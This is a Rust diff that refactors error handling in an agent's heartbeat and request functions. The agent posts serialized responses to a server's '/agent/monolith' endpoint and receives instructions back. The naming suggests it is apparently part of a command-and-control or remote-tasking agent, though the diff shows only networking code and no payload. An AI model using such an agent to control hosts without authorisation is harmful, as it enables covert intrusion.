@@ -2,6 +2,7 @@ use crate::agent::AgentContext;
 use crate::helper::*;
 use talaria::protocol::*;
 
+use anyhow::Result;
 use std::process::Command;
 use std::process::Output;
 
@@ -60,7 +61,7 @@ pub async fn handle_response(agent: &mut AgentContext, response: AgentInstructio
 }
 
 /// Sends a heartbeat to the server.
-pub async fn send_heartbeat(agent: &mut AgentContext) -> Option<AgentInstruction> {
+pub async fn send_heartbeat(agent: &mut AgentContext) -> Result<AgentInstruction> {
     let response = AgentResponse {
         packet_header: agent.generate_packet_header(),
         packet_body: AgentResponseBody::Heartbeat,
@@ -69,25 +70,21 @@ pub async fn send_heartbeat(agent: &mut AgentContext) -> Option<AgentInstruction
     make_request(agent, response).await
 }
 
-/// Sends a request to the server and handles the response.
+/// Serializes and sends an AgentResponse,
+/// returns a deserialized AgentInstruction
 async fn make_request(
     agent: &mut AgentContext,
     request: AgentResponse,
-) -> Option<AgentInstruction> {
+) -> Result<AgentInstruction> {
     let request = AgentResponse::serialize(&request);
     let response = agent
         .http_client
-        .post(agent.server_addr.clone() + "/agent/monolith")
+        .post(agent.url() + "/agent/monolith")
         .body(request)
         .send()
-        .await;
+        .await?;
 
-    match response {
-        Ok(response) => {
-            let bytes = response.bytes().await.unwrap();
-            let instruction = AgentInstruction::deserialize(&bytes.to_vec());
-            Some(instruction)
-        }
-        Err(_) => None,
-    }
+    let bytes = response.bytes().await?;
+    let instruction = AgentInstruction::deserialize(&bytes.to_vec());
+    Ok(instruction)
 }
